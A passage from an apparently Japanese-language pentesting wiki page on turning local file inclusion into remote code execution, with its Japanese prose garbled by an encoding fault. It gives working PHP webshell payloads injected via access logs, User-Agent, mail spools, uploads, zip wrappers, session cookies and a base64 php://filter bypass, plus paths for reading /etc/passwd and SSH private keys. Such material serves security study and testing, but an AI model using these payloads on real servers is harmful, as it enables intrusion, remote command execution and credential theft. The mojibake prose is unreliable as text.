ãã®å¾Œã€æœ€åˆã®æ–‡å­—ã‚’æ¼æ´©ã•ã›ã‚‹ãŸã‚ã«ã€ãƒ•ã‚£ãƒ«ã‚¿ **`dechunk`** ãŒä½¿ç”¨ã•ã‚Œã€ä»–ã®ãƒ•ã‚£ãƒ«ã‚¿ï¼ˆ**base64** ã‚„ **rot13** ãªã©ï¼‰ã¨æœ€çµ‚çš„ã«ãƒ•ã‚£ãƒ«ã‚¿ **convert.iconv.UCS-4.UCS-4LE** ã¨ **convert.iconv.UTF16.UTF-16BE** ãŒä½¿ç”¨ã•ã‚Œã€ä»–ã®æ–‡å­—ã‚’**å…ˆé ­ã«é…ç½®ã—ã¦æ¼æ´©**ã•ã‚Œã¾ã™ã€‚

**è„†å¼±æ€§ã®ã‚ã‚‹é–¢æ•°**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (ã“ã‚Œã ã‘ã‚’èª­ã¿å–ã‚‹ã‚¿ãƒ¼ã‚²ãƒƒãƒˆ)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

æŠ€è¡“çš„ãªè©³ç´°ã«ã¤ã„ã¦ã¯ã€è¨€åŠã•ã‚ŒãŸæŠ•ç¨¿ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼

## LFI2RCE

### ãƒªãƒ¢ãƒ¼ãƒˆãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³

ä»¥å‰ã«èª¬æ˜ã—ãŸå†…å®¹ã¯ã€[**ã“ã®ãƒªãƒ³ã‚¯**](./#remote-file-inclusion) ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

### Apache/Nginxãƒ­ã‚°ãƒ•ã‚¡ã‚¤ãƒ«çµŒç”±

Apacheã¾ãŸã¯Nginxã‚µãƒ¼ãƒãƒ¼ãŒ**LFIã«è„†å¼±**ã§ã‚ã‚‹å ´åˆã€ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ãƒ‰æ©Ÿèƒ½å†…ã§**`/var/log/apache2/access.log`ã¾ãŸã¯`/var/log/nginx/access.log`** ã«ã‚¢ã‚¯ã‚»ã‚¹ã‚’è©¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆ**ã¾ãŸã¯**GETãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿**å†…ã« **`<?php system($_GET['c']); ?>`** ã®ã‚ˆã†ãªPHPã‚·ã‚§ãƒ«ã‚’è¨­å®šã—ã€ãã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ãƒ‰ã—ã¾ã™

{% hint style="warning" %}
ã‚·ã‚§ãƒ«ã«**å˜ä¸€å¼•ç”¨ç¬¦**ã§ã¯ãªã**äºŒé‡å¼•ç”¨ç¬¦**ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€äºŒé‡å¼•ç”¨ç¬¦ãŒæ–‡å­—åˆ— "_**quote;**_" ã«å¤‰æ›´ã•ã‚Œã€**PHPã¯ãã“ã§ã‚¨ãƒ©ãƒ¼ã‚’ã‚¹ãƒ­ãƒ¼**ã—ã€**ãã‚Œä»¥å¤–ã®ä½•ã‚‚å®Ÿè¡Œã•ã‚Œã¾ã›ã‚“**ã€‚

ã¾ãŸã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’**æ­£ã—ãè¨˜è¿°**ã™ã‚‹ã“ã¨ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚ãã†ã—ãªã„ã¨ã€ãƒ­ã‚°ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿è¾¼ã‚€ãŸã³ã«PHPãŒã‚¨ãƒ©ãƒ¼ã‚’ã‚¹ãƒ­ãƒ¼ã—ã€2å›ç›®ã®æ©Ÿä¼šãŒå¾—ã‚‰ã‚Œãªããªã‚Šã¾ã™ã€‚
{% endhint %}

ã“ã‚Œã¯ä»–ã®ãƒ­ã‚°ã§ã‚‚è¡Œã†ã“ã¨ãŒã§ãã¾ã™ãŒã€ãƒ­ã‚°å†…ã®ã‚³ãƒ¼ãƒ‰ã¯URLã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚Œã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ãŸã‚ã€ã“ã‚Œã¯ã‚·ã‚§ãƒ«ã‚’ç ´å£Šã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ãƒ˜ãƒƒãƒ€ãƒ¼ **authorisation "basic"** ã«ã¯ Base64 ã§ "user:password" ãŒå«ã¾ã‚Œã€ãƒ­ã‚°å†…ã§ãƒ‡ã‚³ãƒ¼ãƒ‰ã•ã‚Œã¾ã™ã€‚PHPShell ã‚’ã“ã®ãƒ˜ãƒƒãƒ€ãƒ¼å†…ã«æŒ¿å…¥ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
ä»–ã®å¯èƒ½ãªãƒ­ã‚°ãƒ‘ã‚¹:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
### ãƒ•ã‚¡ã‚¸ãƒ³ã‚°ãƒ¯ãƒ¼ãƒ‰ãƒªã‚¹ãƒˆ: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### ãƒ¡ãƒ¼ãƒ«çµŒç”±

**å†…éƒ¨ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ**ï¼ˆuser@localhostï¼‰ã«PHPãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ï¼ˆ`<?php echo system($_REQUEST["cmd"]); ?>`ã®ã‚ˆã†ãªï¼‰ã‚’å«ã‚€ãƒ¡ãƒ¼ãƒ«ã‚’é€ä¿¡ã—ã€**`/var/mail/<USERNAME>`**ã‚„**`/var/spool/mail/<USERNAME>`**ã®ã‚ˆã†ãªãƒ‘ã‚¹ã§ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ¡ãƒ¼ãƒ«ã«å«ã‚ã¦ã¿ã¦ãã ã•ã„ã€‚

### /proc/\*/fd/\* çµŒç”±

1. å¤šæ•°ã®ã‚·ã‚§ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã¾ã™ï¼ˆä¾‹ï¼š100å€‹ï¼‰
2. [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD)ã‚’ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ãƒ‰ã—ã¾ã™ã€‚ã“ã“ã§ã€$PIDã¯ãƒ—ãƒ­ã‚»ã‚¹ã®PIDï¼ˆãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã§ãã¾ã™ï¼‰ã§ã‚ã‚Šã€$FDã¯ãƒ•ã‚¡ã‚¤ãƒ«ãƒ‡ã‚£ã‚¹ã‚¯ãƒªãƒ—ã‚¿ï¼ˆã“ã‚Œã‚‚ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã§ãã¾ã™ï¼‰ã§ã™ã€‚

### /proc/self/environ çµŒç”±

ãƒ­ã‚°ãƒ•ã‚¡ã‚¤ãƒ«ã®ã‚ˆã†ã«ã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’User-Agentã§é€ä¿¡ã™ã‚‹ã¨ã€/proc/self/environãƒ•ã‚¡ã‚¤ãƒ«å†…ã«åæ˜ ã•ã‚Œã¾ã™ã€‚
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰çµŒç”±

ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã§ãã‚‹å ´åˆã¯ã€ã‚·ã‚§ãƒ«ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ãã®ä¸­ã«ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ãƒˆã—ã¦ãã ã•ã„ï¼ˆä¾‹ï¼š`<?php system($_GET['c']); ?>`ï¼‰ã€‚
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿ã‚„ã™ãä¿ã¤ãŸã‚ã«ã¯ã€ç”»åƒ/ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ/PDFã®ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã«ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ãƒˆã™ã‚‹ã®ãŒæœ€é©ã§ã™

### Zipãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã™ã‚‹æ–¹æ³•

PHPã‚·ã‚§ãƒ«ãŒåœ§ç¸®ã•ã‚ŒãŸZIPãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã¦ã‚¢ã‚¯ã‚»ã‚¹ã—ã¾ã™:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### PHPã‚»ãƒƒã‚·ãƒ§ãƒ³çµŒç”±

ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆãŒPHPã‚»ãƒƒã‚·ãƒ§ãƒ³ï¼ˆPHPSESSIDï¼‰ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ã¾ã™ã€‚
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
PHPã§ã¯ã€ã“ã‚Œã‚‰ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã¯`/var/lib/php5/sess\[PHPSESSID]`ãƒ•ã‚¡ã‚¤ãƒ«ã«ä¿å­˜ã•ã‚Œã¾ã™ã€‚
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
ã‚¯ãƒƒã‚­ãƒ¼ã‚’`<?php system('cat /etc/passwd');?>`ã«è¨­å®šã—ã¾ã™ã€‚
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
LFIã‚’ä½¿ç”¨ã—ã¦PHPã‚»ãƒƒã‚·ãƒ§ãƒ³ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ãƒ‰ã—ã¾ã™ã€‚
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### SSHçµŒç”±

sshãŒã‚¢ã‚¯ãƒ†ã‚£ãƒ–ã§ã‚ã‚‹å ´åˆã¯ã€ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ç¢ºèªã—ã¾ã™ï¼ˆ/proc/self/statusï¼†/etc/passwdï¼‰ãã—ã¦**\<HOME>/.ssh/id\_rsa**ã«ã‚¢ã‚¯ã‚»ã‚¹ã‚’è©¦ã¿ã¾ã™ã€‚

### **vsftpd** _ãƒ­ã‚°_çµŒç”±

FTPã‚µãƒ¼ãƒãƒ¼vsftpdã®ãƒ­ã‚°ã¯**_/var/log/vsftpd.log_**ã«ã‚ã‚Šã¾ã™ã€‚ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³ï¼ˆLFIï¼‰è„†å¼±æ€§ãŒå­˜åœ¨ã—ã€å…¬é–‹ã•ã‚ŒãŸvsftpdã‚µãƒ¼ãƒãƒ¼ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ãŒå¯èƒ½ãªå ´åˆã€æ¬¡ã®æ‰‹é †ãŒè€ƒæ…®ã•ã‚Œã¾ã™ï¼š

1. ãƒ­ã‚°ã‚¤ãƒ³ãƒ—ãƒ­ã‚»ã‚¹ä¸­ã«ãƒ¦ãƒ¼ã‚¶ãƒ¼åãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã«PHPãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ãƒˆã—ã¾ã™ã€‚
2. ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³å¾Œã€LFIã‚’ä½¿ç”¨ã—ã¦**_/var/log/vsftpd.log_**ã‹ã‚‰ã‚µãƒ¼ãƒãƒ¼ãƒ­ã‚°ã‚’å–å¾—ã—ã¾ã™ã€‚

### PHPãƒ™ãƒ¼ã‚¹64ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼çµŒç”±ï¼ˆbase64ã‚’ä½¿ç”¨ï¼‰

[ã“ã®](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64)è¨˜äº‹ã«ç¤ºã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«ã€PHPãƒ™ãƒ¼ã‚¹64ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã¯ébase64ã‚’ç„¡è¦–ã—ã¾ã™ã€‚ã“ã‚Œã‚’ä½¿ç”¨ã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«æ‹¡å¼µå­ã®ãƒã‚§ãƒƒã‚¯ã‚’ãƒã‚¤ãƒ‘ã‚¹ã§ãã¾ã™ï¼šbase64ã§çµ‚ã‚ã‚‹".php"ã‚’æä¾›ã™ã‚‹ã¨ã€"."ã‚’ç„¡è¦–ã—ã¦"php"ã‚’base64ã«è¿½åŠ ã—ã¾ã™ã€‚ä»¥ä¸‹ã¯ä¾‹ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã§ã™ï¼š
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### phpãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã‚’ä»‹ã—ã¦ï¼ˆãƒ•ã‚¡ã‚¤ãƒ«ä¸è¦ï¼‰

ã“ã®[**è§£èª¬**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)ã§ã¯ã€**phpãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã‚’ä½¿ç”¨ã—ã¦**ä»»æ„ã®ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’å‡ºåŠ›ã§ãã‚‹ã“ã¨ãŒèª¬æ˜ã•ã‚Œã¦ã„ã¾ã™ã€‚ã¤ã¾ã‚Šã€**ãƒ•ã‚¡ã‚¤ãƒ«ã«æ›¸ãè¾¼ã‚€å¿…è¦ãªã—ã«**ã€ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ãƒ‰ç”¨ã«**ä»»æ„ã®phpã‚³ãƒ¼ãƒ‰ã‚’ç”Ÿæˆ**ã§ãã¾ã™ã€‚

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### ã‚»ã‚°ãƒ¡ãƒ³ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ãƒ•ã‚©ãƒ¼ãƒ«ãƒˆã‚’ä»‹ã—ã¦

`/tmp`ã«**ä¸€æ™‚çš„ã«ä¿å­˜**ã•ã‚Œã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã‚’**ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰**ã—ã€**åŒã˜ãƒªã‚¯ã‚¨ã‚¹ãƒˆ**ã§**ã‚»ã‚°ãƒ¡ãƒ³ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ãƒ•ã‚©ãƒ¼ãƒ«ãƒˆ**ã‚’ãƒˆãƒªã‚¬ãƒ¼ã—ã€ãã®å¾Œ**ä¸€æ™‚ãƒ•ã‚¡ã‚¤ãƒ«ãŒå‰Šé™¤ã•ã‚Œãªã„**ãŸã‚ã€ãã‚Œã‚’æ¤œç´¢ã§ãã¾ã™ã€‚

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Nginxã®ä¸€æ™‚ãƒ•ã‚¡ã‚¤ãƒ«ã‚¹ãƒˆãƒ¬ãƒ¼ã‚¸ã‚’ä»‹ã—ã¦

**ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³**ã‚’è¦‹ã¤ã‘ã€**Nginx**ãŒPHPã®å‰ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹å ´åˆã€æ¬¡ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’ä½¿ç”¨ã—ã¦RCEã‚’å–å¾—ã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ï¼š

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### PHP\_SESSION\_UPLOAD\_PROGRESSã‚’ä»‹ã—ã¦

ã‚»ãƒƒã‚·ãƒ§ãƒ³ãŒãªãã€`session.auto_start`ãŒ`Off`ã§ã‚‚**ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³**ã‚’è¦‹ã¤ã‘ãŸå ´åˆã€**`PHP_SESSION_UPLOAD_PROGRESS`**ã‚’**ãƒãƒ«ãƒãƒ‘ãƒ¼ãƒˆPOST**ãƒ‡ãƒ¼ã‚¿ã§æä¾›ã™ã‚‹ã¨ã€PHPãŒ**ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’æœ‰åŠ¹ã«**ã—ã¾ã™ã€‚ã“ã‚Œã‚’æ‚ªç”¨ã—ã¦RCEã‚’å–å¾—ã§ãã¾ã™ï¼š

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### Windowsã§ã®ä¸€æ™‚ãƒ•ã‚¡ã‚¤ãƒ«ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã‚’ä»‹ã—ã¦

**ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³**ã‚’è¦‹ã¤ã‘ã€ã‚µãƒ¼ãƒãƒ¼ãŒ**Windows**ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹å ´åˆã€RCEã‚’å–å¾—ã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ï¼š

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### phpinfo()ï¼ˆfile\_uploads = onï¼‰ã‚’ä»‹ã—ã¦

**ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³**ã‚’è¦‹ã¤ã‘ã€file\_uploads = onã®phpinfo()ã‚’å…¬é–‹ã™ã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ãŒã‚ã‚‹å ´åˆã€RCEã‚’å–å¾—ã§ãã¾ã™ï¼š

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### compress.zlib + `PHP_STREAM_PREFER_STUDIO` + ãƒ‘ã‚¹é–‹ç¤ºã‚’ä»‹ã—ã¦

**ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³**ã‚’è¦‹ã¤ã‘ã€ä¸€æ™‚ãƒ•ã‚¡ã‚¤ãƒ«ã®ãƒ‘ã‚¹ã‚’**å¤–éƒ¨ã«é€ä¿¡**ã§ãã‚‹ãŒã€**ã‚µãƒ¼ãƒãƒ¼**ãŒ**ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ãƒ‰ã™ã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã«PHPãƒãƒ¼ã‚¯ãŒã‚ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèª**ã—ã¦ã„ã‚‹å ´åˆã€ã“ã®**ç«¶åˆçŠ¶æ…‹**ã‚’ä½¿ç”¨ã—ã¦ãã®ãƒã‚§ãƒƒã‚¯ã‚’**ãƒã‚¤ãƒ‘ã‚¹**ã§ãã¾ã™ï¼š

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### æ°¸é ã®å¾…æ©Ÿ + ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã‚’ä»‹ã—ã¦

LFIã‚’æ‚ªç”¨ã—ã¦**ä¸€æ™‚ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰**ã—ã€ã‚µãƒ¼ãƒãƒ¼ãŒ**PHPå®Ÿè¡Œã‚’åœæ­¢**ã•ã›ã‚‹ã“ã¨ãŒã§ãã‚Œã°ã€ãã®å¾Œ**æ•°æ™‚é–“ã‹ã‘ã¦ãƒ•ã‚¡ã‚¤ãƒ«åã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹**ã—ã¦ä¸€æ™‚ãƒ•ã‚¡ã‚¤ãƒ«ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### è‡´å‘½çš„ã‚¨ãƒ©ãƒ¼ã¸

`/usr/bin/phar`ã€`/usr/bin/phar7`ã€`/usr/bin/phar.phar7`ã€`/usr/bin/phar.phar`ã®ã„ãšã‚Œã‹ã‚’ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ãƒ‰ã™ã‚‹ã¨ã€PHPè‡´å‘½çš„ã‚¨ãƒ©ãƒ¼ãŒç™ºç”Ÿã—ã¾ã™ï¼ˆåŒã˜ã‚‚ã®ã‚’2å›ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ãƒ‰ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼‰ã€‚

**ã“ã‚ŒãŒã©ã®ã‚ˆã†ã«æœ‰ç”¨ã‹ã¯ã‚ã‹ã‚Šã¾ã›ã‚“ãŒã€æœ‰ç”¨ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚**\
_PHPè‡´å‘½çš„ã‚¨ãƒ©ãƒ¼ã‚’å¼•ãèµ·ã“ã—ã¦ã‚‚ã€PHPã«ã‚ˆã£ã¦ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã•ã‚ŒãŸä¸€æ™‚ãƒ•ã‚¡ã‚¤ãƒ«ã¯å‰Šé™¤ã•ã‚Œã¾ã™ã€‚_

<figure><img src="../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

## å‚è€ƒæ–‡çŒ®

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\
* [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)ã‚µãƒ¼ãƒãƒ¼ã«å‚åŠ ã—ã¦ã€çµŒé¨“è±Šå¯Œãªãƒãƒƒã‚«ãƒ¼ã‚„ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ãƒãƒ³ã‚¿ãƒ¼ã¨ã‚³ãƒŸãƒ¥ãƒ‹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å–ã‚Šã¾ã—ã‚‡ã†ï¼

**ãƒãƒƒã‚­ãƒ³ã‚°ã®æ´å¯Ÿ**\
ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚¹ãƒªãƒ«ã¨ãƒãƒ£ãƒ¬ãƒ³ã‚¸ã«æ·±ãå…¥ã‚Šè¾¼ã‚€ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã«å‚åŠ ã—ã¾ã—ã‚‡ã†

**ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ãƒãƒƒã‚¯ãƒ‹ãƒ¥ãƒ¼ã‚¹**\
ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ã®ãƒ‹ãƒ¥ãƒ¼ã‚¹ã¨æƒ…å ±ã‚’é€šã˜ã¦ã€ãƒãƒƒã‚­ãƒ³ã‚°ã®ä¸–ç•Œã‚’æœ€æ–°ã®çŠ¶æ…‹ã§æŠŠæ¡ã—ã¾ã—ã‚‡ã†

**æœ€æ–°ã®ã‚¢ãƒŠã‚¦ãƒ³ã‚¹ãƒ¡ãƒ³ãƒˆ**\
æœ€æ–°ã®ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ã®é–‹å§‹ã‚„é‡è¦ãªãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã®æ›´æ–°æƒ…å ±ã‚’æŠŠæ¡ã—ã¾ã—ã‚‡ã†

**[**Discord**](https://discord.com/invite/N3FrSbmwdy)**ã«å‚åŠ ã—ã¦ã€ä»Šæ—¥ã‹ã‚‰ãƒˆãƒƒãƒ—ãƒãƒƒã‚«ãƒ¼ã¨å”åŠ›ã‚’å§‹ã‚ã¾ã—ã‚‡ã†ï¼
